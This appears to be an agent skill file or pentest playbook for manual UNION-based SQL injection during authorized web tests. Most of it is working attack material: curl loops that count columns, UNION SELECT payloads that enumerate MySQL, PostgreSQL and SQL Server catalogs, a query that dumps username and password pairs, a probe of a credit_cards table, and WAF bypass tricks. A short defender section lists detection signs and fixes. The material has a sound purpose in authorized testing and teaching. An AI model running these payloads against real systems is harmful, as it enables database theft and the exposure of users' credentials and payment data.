---
name: sqli-union-extraction
description: Use when a confirmed SQL injection reflects query output on the
  page and you need to extract data with UNION SELECT during an authorized
  test. Covers column counting with ORDER BY, finding visible columns, reading
  databases, tables, and columns from information_schema and engine-specific
  catalogs, and dumping credentials safely. Use when error-based or UNION
  output is visible, when you confirmed injection with sqli-detection, or
  when sqlmap is unavailable and you must extract by hand.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: 2026-10-23
parent: web-sqli
requires: [web-sqli]
extends: []
relates: [api-security-testing]
tools:
  - name: curl
    version: 8.5
  - name: Burp Suite
    version: 2026.2
  - name: Python
    version: 3.12
---

UNION-based extraction is the fastest SQL injection technique because the
database prints the stolen data directly into the page. This skill covers the
full manual UNION workflow for authorized tests: finding the column count,
identifying which columns render on the page, enumerating schema objects, and
dumping only the data needed to prove impact. It assumes injection is already
confirmed (see sqli-detection) and output is visible. When nothing is
printed, use sqli-blind instead.

## Quick Workflow

1. Confirm which parameter is injectable and that output is reflected.
2. Find the column count with ORDER BY, increasing until the page breaks.
3. Find visible columns with UNION SELECT of incrementing integers.
4. Read the current user, database, and version through a visible column.
5. Enumerate databases, then tables, then columns for the target schema.
6. Dump the minimum rows needed to prove impact (one or two rows, never full
   PII tables).
7. Log every payload and response for the report.

## 1. Column counting

ORDER BY breaks when the number exceeds the real column count, so the last
working number is your count.

```bash
# Increase n until the page errors or goes blank, then use n-1
for n in 1 2 3 4 5 6 7 8 9 10; do
  code=$(curl -s -o /dev/null -w '%{http_code}' \
    "https://target.example/item?id=5%20ORDER%20BY%20$n--%20-")
  echo "ORDER BY $n -> HTTP $code"
done

# Alternative: UNION SELECT NULL counting (works when ORDER BY is filtered)
for n in 1 2 3 4 5 6; do
  nulls=$(python3 -c "print(','.join(['NULL']*$n))")
  code=$(curl -s -o /dev/null -w '%{http_code}' \
    "https://target.example/item?id=-5%20UNION%20SELECT%20${nulls}--%20-")
  echo "$n NULLs -> HTTP $code"
done
```

Use a negative or nonexistent ID (like `-5`) so the original row returns
nothing and only your UNION row prints.

## 2. Finding visible columns

Replace the NULLs with incrementing integers. The numbers that appear on the
page are the columns you can read through.

```bash
# Example with 4 columns: see which numbers render
curl -s "https://target.example/item?id=-5%20UNION%20SELECT%201,2,3,4--%20-"

# If column 3 renders, read through it
curl -s "https://target.example/item?id=-5%20UNION%20SELECT%201,2,user(),4--%20-"
curl -s "https://target.example/item?id=-5%20UNION%20SELECT%201,2,version(),4--%20-"
curl -s "https://target.example/item?id=-5%20UNION%20SELECT%201,2,database(),4--%20-"
```

If no integer renders, the output may be inside an attribute, a hidden field,
or a second page. View the raw HTML source before concluding UNION is
impossible.

## 3. Schema enumeration

Walk the catalog: databases, tables in the target database, columns in the
interesting tables.

```bash
# MySQL and MariaDB
curl -s "https://target.example/item?id=-5%20UNION%20SELECT%201,2,schema_name,4%20FROM%20information_schema.schemata--%20-"
curl -s "https://target.example/item?id=-5%20UNION%20SELECT%201,2,table_name,4%20FROM%20information_schema.tables%20WHERE%20table_schema%3D'targetdb'--%20-"
curl -s "https://target.example/item?id=-5%20UNION%20SELECT%201,2,column_name,4%20FROM%20information_schema.columns%20WHERE%20table_name%3D'users'--%20-"

# PostgreSQL
curl -s "https://target.example/item?id=-5%20UNION%20SELECT%201,2,datname,4%20FROM%20pg_database--%20-"
curl -s "https://target.example/item?id=-5%20UNION%20SELECT%201,2,tablename,4%20FROM%20pg_tables%20WHERE%20schemaname%3D'public'--%20-"

# Microsoft SQL Server
curl -s "https://target.example/item?id=-5%20UNION%20SELECT%201,2,name,4%20FROM%20sys.databases--%20-"
curl -s "https://target.example/item?id=-5%20UNION%20SELECT%201,2,name,4%20FROM%20targetdb.sys.tables--%20-"
```

Concatenate multi-row results into one visible column so a single request
returns the whole list.

```bash
# MySQL: one request returns every table name
curl -s "https://target.example/item?id=-5%20UNION%20SELECT%201,2,group_concat(table_name),4%20FROM%20information_schema.tables%20WHERE%20table_schema%3D'targetdb'--%20-"

# PostgreSQL equivalent
curl -s "https://target.example/item?id=-5%20UNION%20SELECT%201,2,string_agg(tablename,','),4%20FROM%20pg_tables--%20-"
```

## 4. Targeted dumping with minimal impact

Dump only what proves impact. Concatenate credential pairs into the visible
column and limit rows.

```bash
# One request: usernames and password hashes, first 3 rows only
curl -s "https://target.example/item?id=-5%20UNION%20SELECT%201,2,group_concat(username,0x3a,password),4%20FROM%20targetdb.users%20LIMIT%203--%20-"

# Prove read access to a sensitive table without dumping it fully
curl -s "https://target.example/item?id=-5%20UNION%20SELECT%201,2,COUNT(*),4%20FROM%20targetdb.credit_cards--%20-"
```

Never dump full customer tables, never exfiltrate live PII beyond the minimum
proof, and never write to the database during a UNION test unless the rules of
engagement explicitly allow it.

## Edge cases

- Type mismatch kills the UNION. Match column types with
  `CAST(value AS CHAR)` or put NULL in non-visible positions and data only
  in string columns.
- The application wraps the parameter in quotes you did not expect. Test
  both `-5 UNION ... -- -` and `-5' UNION ... -- -` styles.
- ORDER BY is blocked by a filter. Fall back to the UNION SELECT NULL
  counting loop, which needs no ORDER BY keyword.
- Output lands in a JSON field or HTML attribute. Read view-source and
  search for your marker integers instead of trusting the rendered page.
- Only one row prints and it is the wrong one. Add `LIMIT 1,1`, `LIMIT 2,1`
  offsets to page through UNION rows one at a time.

## Escalation

- No column renders after trying integers: test whether the page prints
  only the first row by using a valid ID plus UNION (the original row may
  shadow yours), then switch to the negative-ID technique.
- information_schema is blocked: query the target tables directly if you can
  guess names (users, admins, customers), or pivot to error-based
  extraction which needs no catalog access.
- The WAF strips the word UNION: try case variation, inline comments
  (`UN/**/ION`), or move to boolean-blind extraction which avoids the
  keyword entirely.
- Dumping is too slow through the browser: replay the confirmed UNION
  payload through sqlmap with `--technique=U` to automate enumeration.

## Detection and defender view

Defenders see UNION extraction as repeated requests containing `UNION`,
`SELECT`, and catalog names like `information_schema` or `pg_tables`,
often with negative IDs and comment terminators. It is the noisiest SQL
injection class and the easiest for a WAF to signature. The fix is the same
as for all SQL injection: parameterized queries, least-privilege database
accounts so the web user cannot read unrelated schemas, and generic error
pages that never leak query structure.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application).
- CWE-89 (Improper Neutralization of Special Elements used in an SQL
  Command, SQL Injection).
- OWASP Testing Guide: Testing for SQL Injection (OTG-INPVAL-005).
- PortSwigger Web Security Academy: UNION attack cheat sheet.
- MySQL information_schema reference, PostgreSQL catalog documentation.
